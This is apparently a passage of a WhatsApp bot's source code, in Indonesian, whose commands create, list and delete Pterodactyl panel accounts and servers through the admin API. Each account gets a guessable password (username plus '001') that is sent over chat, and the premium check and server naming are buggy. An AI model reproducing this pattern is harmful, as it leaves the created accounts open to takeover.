let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '2gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "2024"
let cpu = "70"
let disk = "2024"
let email = username + "Zyn@Tzy.com"
akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '3gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "3024"
let cpu = "80"
let disk = "3024"
let email = username + "Zyn@Tzy.com"
akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '4gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "4024"
let cpu = "80"
let disk = "4024"
let email = username + "Zyn@Tzy.com"
akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '5gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "5024"
let cpu = "100"
let disk = "5024"
let email = username + "Zyn@Tzy.com"
akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '6gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "6024"
let cpu = "160"
let disk = "6024"
let email = username + "Zyn@Tzy.com"
akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '7gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "7024"
let cpu = "170"
let disk = "7024"
let email = username + "Zyn@Tzy.com"
akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '8gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "8024"
let cpu = "180"
let disk = "8024"
let email = username + "Zyn@Tzy.com"
akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '9gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "9024"
let cpu = "190"
let disk = "9024"
let email = username + "zxv@sweetrabit.ml"
akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case 'unli': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "Zyn@Tzy.com"
akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case "listsrv": {
if (!isOwner) return reply(mess.only.owner)
let page = args[0] ? args[0] : '1';
let f = await fetch(domain + "/api/application/servers?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
let sections = [];
let messageText = "Berikut adalah daftar server:\n\n";

for (let server of servers) {
let s = server.attributes;

let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
});

let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;

messageText += `ID Server: ${s.id}\n`;
messageText += `Nama Server: ${s.name}\n`;
messageText += `Status: ${status}\n\n`;
}

messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
messageText += `Total Server: ${res.meta.pagination.count}`;

await zyn.sendMessage(m.chat, { text: messageText }, { quoted: m });

if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
reply(`Gunakan perintah ${prefix ? prefix : '.'}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
}
}
break;

case "delsrv": {
if (!isOwner) return reply(mess.only.owner)
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('Server tidak ditemukan')
reply('Berhasil minghapus Server.')
}
break
 
case 'totalfitur': {
ngaceng = fs.readFileSync("./STINGER-V4.js").toString(),
matches = ngaceng.match(/case '[^']+'(?!.*case '[^']+')/g) || [],
caseCount = matches.length,
caseNames = matches.map(match => match.match(/case '([^']+)'/)[1]);
let block = await zyn.fetchBlocklist()
let gcall = Object.values(await zyn.groupFetchAllParticipating().catch(_=> null))
let totalCases = caseCount,
listCases = caseNames.join('\n${prefix} ');
reply(` *Haii ${pushname}*

𝐓𝐨𝐭𝐚𝐥 𝐅𝐢𝐭𝐮𝐫 : *${totalFitur()} Fitur*`)
}
